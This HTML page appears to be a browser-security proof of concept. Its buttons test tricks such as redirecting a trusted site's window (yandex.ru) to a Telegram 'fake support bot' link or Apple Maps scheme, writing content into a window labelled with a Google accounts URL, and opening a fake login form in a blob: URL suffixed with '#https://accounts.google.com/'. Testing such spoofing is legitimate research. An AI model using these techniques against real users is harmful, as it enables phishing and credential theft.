<html>
<body style="zoom: 200%;">
  <h1>Redirect to Telegram on Yandex</h1>
  <input onclick="var x = window.open('https://www.yandex.ru/');setTimeout(function(){x.location='tg://resolve?domain=yandex_support_fake_bot'}, 3000)" type="button" value="Open Telegram" />
  <br>

  <h1>Redirect to Apple Maps on Yandex</h1>
  <input onclick="var x = window.open('https://www.yandex.ru/');setTimeout(function(){x.location='maps://?address=One+Apple+Park+Way,Cupertino,United+States'}, 3000)" type="button" value="Open Apple Maps" />  

  <h1>Redirect to Apple Maps on Same Origin</h1>
  <input onclick="var x = window.open('https://pavor84.github.io/');setTimeout(function(){x.location='maps://?address=One+Apple+Park+Way,Cupertino,United+States'}, 1000)" type="button" value="Open Apple Maps" />  

  <h1>Redirect to Apple Maps on Blank</h1>
  <input onclick="var x = window.open('');setTimeout(function(){x.location='maps://?address=One+Apple+Park+Way,Cupertino,United+States'}, 1000)" type="button" value="Open Apple Maps" />  

  <h1>Open Apple Maps in New Window</h1>
  <input onclick="window.open('maps://?address=One+Apple+Park+Way,Cupertino,United+States');" type="button" value="Open Apple Maps" />  

  <h1>Open and change content</h1>
  <input onclick="var x = window.open('about:blank#https://accounts.google.com/'); x.write('<h1>Hello, world</h1>'); x.close();" type="button" value="Open and change content" />

  <h1>Open blob</h1>
  <input id="createBlob" type="button" value="Open blob" />

  <script>
    document.getElementById('createBlob').addEventListener('click', () => {
        const authForm = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Login</title>
            </head>
            <body>
                <h1>Login</h1>
                <form action="/login" method="POST">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" required><br><br>

                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required><br><br>

                    <button type="submit">Login</button>
                </form>
            </body>
            </html>
        `;

        const blob = new Blob([authForm], { type: 'text/html' });

        const blobUrl = URL.createObjectURL(blob);

        const blobUrlWithHash = `${blobUrl}#https://accounts.google.com/`;

        window.open(blobUrlWithHash);
    });
  </script>

</body>
</html>
